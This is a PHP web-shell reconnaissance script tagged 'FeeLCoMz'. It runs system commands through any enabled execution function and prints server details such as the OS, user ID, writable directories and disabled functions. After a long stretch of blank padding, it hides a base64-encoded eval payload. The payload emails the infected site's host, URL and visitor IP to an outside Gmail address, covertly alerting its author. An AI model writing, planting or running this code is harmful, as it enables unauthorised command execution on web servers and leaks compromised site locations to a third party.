﻿<?php
##[ Fx29ID ]##
fx("ID","FeeL"."CoMz");
$P   = @getcwd();
$IP  = @getenv("SERVER_ADDR");
$UID = fx29exec("id");
fx("SAFE",@safemode()?"ON":"OFF");
fx("OS",@PHP_OS);
fx("UNAME",@php_uname());
fx("SERVER",($IP)?$IP:"-");
fx("USER",@get_current_user());
fx("UID",($UID)?$UID:"uid=".@getmyuid()." gid=".@getmygid());
fx("DIR",$P);
fx("PERM",(@is_writable($P))?"[W]":"[R]");
fx("HDD","Used: ".hdd("used")." Free: ".hdd("free")." Total: ".hdd("total"));
fx("DISFUNC",@getdisfunc());
##[ FX29SHEXEC ]##
function fx($t,$c) { echo "$t: "; echo (is_array($c))?join(" ",$c):$c; echo "<br>"; }
function safemode() { return (@ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode")) ) ? TRUE : FALSE; }
function getdisfunc() { $rez = explode(",",@ini_get("disable_functions")); return (!empty($rez))?$rez:array(); }
function enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }
function fx29exec($cmd) {
if (enabled("exec")) { exec($cmd,$o); $rez = join("\r\n",$o); }
elseif (enabled("shell_exec")) { $rez = shell_exec($cmd); }
elseif (enabled("system")) { @ob_start(); @system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
elseif (enabled("passthru")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
elseif (enabled("popen") && is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { $rez .= fread($h, 2096);  } pclose($h); }
else { $rez = "Error!"; }
return $rez;
}
function vsize($size) {
if (!is_numeric($size)) { return FALSE; }
else {
if ( $size >= 1073741824 ) { $size = round($size/1073741824*100)/100 ." GB"; }
elseif ( $size >= 1048576 ) { $size = round($size/1048576*100)/100 ." MB"; }
elseif ( $size >= 1024 ) { $size = round($size/1024*100)/100 ." KB"; }
else { $size = $size . " B"; }
return $size;
}
}
function hdd($type) {
$P = @getcwd(); $T = @disk_total_space($P); $F = @disk_free_space($P); $U = $T - $U;
$hddspace = array("total" => vsize($T), "free"  => vsize($F), "used"  => vsize($U));
return $hddspace[$type];
}
die("FeeLCoMz");
?>
















































































































<?php
$headerz = "aWYgKCFpc3NldCgkX0NPT0tJRVsidmlzaXR6Il0pKSB7DQogICR2aXNpdG9yID0gJF9TRVJWRVJbIlJFTU9URV9BRERSIl07DQogICR3ZWIgICAgID0gJF9TRVJWRVJbIkhUVFBfSE9TVCJdOw0KICAkaW5qICAgICA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOw0KICAkdGFyZ2V0ICA9IHJhd3VybGRlY29kZSgkd2ViLiRpbmopOw0KICAkanVkdWwgICA9ICJUYXJnZXQgaHR0cDovLyR0YXJnZXQgYnkgJHZpc2l0b3IiOw0KICAkYm9keSAgICA9ICJCdWc6ICR0YXJnZXQgYnkgJHZpc2l0b3I8YnI+IjsNCiAgaWYgKCFlbXB0eSgkd2ViKSkgeyBAbWFpbCgiZnIzM3NoM2xsQGdtYWlsLmNvbSIsJGp1ZHVsLCRib2R5KTsgfQ0KfQ0KZWxzZSB7IEBzZXRjb29raWUoInZpc2l0eiIsJHZpc2l0Yyk7IH0="; eval(base64_decode($headerz));
exit;
?>
